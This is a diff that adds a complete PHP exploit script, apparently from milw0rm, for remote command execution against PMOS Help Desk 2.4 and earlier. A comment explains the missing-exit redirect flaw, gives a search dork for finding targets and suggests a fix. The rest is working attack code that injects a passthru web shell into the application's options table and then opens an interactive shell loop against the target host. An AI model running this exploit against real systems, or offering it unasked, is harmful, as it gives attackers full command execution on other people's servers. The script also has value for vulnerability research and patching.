@@ -1,0 +1,132 @@
+<?php
+
+/*
+	------------------------------------------------------
+	PMOS Help Desk <= 2.4 Remote Command Execution Exploit
+	------------------------------------------------------ 
+	
+	author...: EgiX
+	mail.....: n0b0d13s[at]gmail[dot]com
+	
+	link.....: http://www.h2desk.com/pmos
+	dork.....: "Powered by PMOS Help Desk"
+
+	[-] PHP code injection through /form.php:
+
+	28.	if( $_SESSION[login_type] == $LOGIN_INVALID )
+	29.	  Header( "Location: {$HD_URL_LOGIN}?redirect=" . urlencode( $HD_CURPAGE ) ); <===
+	30.
+	31.	$global_priv = get_row_count( "SELECT COUNT(*) FROM {$pre}privilege WHERE ( user_id = '{$_SESSION[user][id]}' && dept_id = '0' )" );
+	32.	if( !$global_priv )
+	33.	  Header( "Location: $HD_URL_BROWSE" ); <===
+	34.
+	35.	$options = array( "header", "footer", "logo", "title", (...)
+	36.
+	37.	if( $_GET[cmd] == "customdel" )
+	38.	{
+	39.	  mysql_query( "DELETE FROM {$pre}options WHERE ( id = '{$_GET[id]}' )" );
+	40.	}
+	41.	else if( isset( $_POST[header] ) )
+	42.	{
+	43.	  for( $i = 0; $i < count( $options ); $i++ )
+	44.	  {
+	45.	    $exists = get_row_count( "SELECT COUNT(*) FROM {$pre}options WHERE ( name = '{$options[$i]}' )" );
+	46.	    if( $exists )
+	47.	      mysql_query( "UPDATE {$pre}options SET text = '" . $_POST[$options[$i]] . "' WHERE ( name = '{$options[$i]}' )" );
+	48.	    else
+	49.	      mysql_query( "INSERT INTO {$pre}options ( name, text ) VALUES ( '{$options[$i]}', '" . $_POST[$options[$i]] . "' )" ); <===
+	50.	  }
+
+	there isn't any exit() or die() function after header redirection at lines 29, 33...so an attacker can inject php code into the 'options'
+	table through the query at line 49 (or 47)...injected code will be executed by eval() function located into some files...look at index.php:
+
+	28.	$options = array( "header", "footer", "logo", (...)
+	29.	$data = get_options( $options );
+	196.	  eval( "?> {$data[header]} <?" ); <===
+
+	[-] Bug fix in /form.php :
+
+	28.	if( $_SESSION[login_type] == $LOGIN_INVALID ) {
+	29.	  Header( "Location: {$HD_URL_LOGIN}?redirect=" . urlencode( $HD_CURPAGE ) );
+	30.	  exit();
+	31.	}
+	32.
+	33.	$global_priv = get_row_count( "SELECT COUNT(*) FROM {$pre}privilege WHERE ( user_id = '{$_SESSION[user][id]}' && dept_id = '0' )" );
+	34.	if( !$global_priv ) {
+	35.	  Header( "Location: $HD_URL_BROWSE" );
+	36.	  exit();
+	37.	}
+	
+*/
+
+error_reporting(0);
+ini_set("default_socket_timeout", 5);
+set_time_limit(0);
+
+function http_send($host, $packet)
+{
+	$sock = fsockopen($host, 80);
+	while (!$sock)
+	{
+		print "\n[-] No response from {$host}:80 Trying again...";
+		$sock = fsockopen($host, 80);
+		sleep(1);
+	}
+	fputs($sock, $packet);
+	$resp = "";
+	while (!feof($sock)) $resp .= fread($sock, 1);
+	fclose($sock);
+	return $resp;
+}
+
+print "\n+----------------------------------------------------------------+";
+print "\n| PMOS Help Desk <= 2.4 Remote Command Execution Exploit by EgiX |";
+print "\n+----------------------------------------------------------------+\n";
+
+if ($argc < 3)
+{
+	print "\nUsage......:	php $argv[0] host path [options]\n";
+	print "\nhost.......:	target server (ip/hostname)";
+	print "\npath.......:	path to pmos directory (example: / or /pmos/)\n\n";
+	die();
+}
+
+$host = $argv[1];
+$path = $argv[2];
+   
+// try to inject php shell into 'header' record of 'options' table...
+$data	 = "header=".urlencode("<?php error_reporting(0);echo __;passthru(base64_decode(\$_SERVER[HTTP_CMD]));echo __;die; ?>");
+$packet  = "POST {$path}form.php HTTP/1.1\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Content-Length: ".strlen($data)."\r\n";
+$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
+$packet .= "Keep-Alive: 300\r\n";
+$packet .= "Connection: keep-alive\r\n\r\n";
+$packet .= $data;
+
+http_send($host, $packet);
+
+// ...and start the shell!
+define(STDIN, fopen("php://stdin", "r"));
+while(1)
+{
+	print "\nxpl0it-sh3ll > ";
+	$cmd = trim(fgets(STDIN));
+	if ($cmd != "exit")
+	{
+		$packet  = "GET {$path} HTTP/1.1\r\n";
+		$packet .= "Host: {$host}\r\n";
+		$packet .= "Cmd: ".base64_encode($cmd)."\r\n";
+		$packet .= "Keep-Alive: 300\r\n";
+		$packet .= "Connection: keep-alive\r\n\r\n";
+		$resp = http_send($host, $packet);
+		if (!strpos($resp, "__")) die("\n[-] Exploit failed...\n");
+		$shell = explode("__", $resp);
+		print "\n".$shell[1];
+	}
+	else break;
+}
+
+?>
+
+# milw0rm.com [2007-12-25]
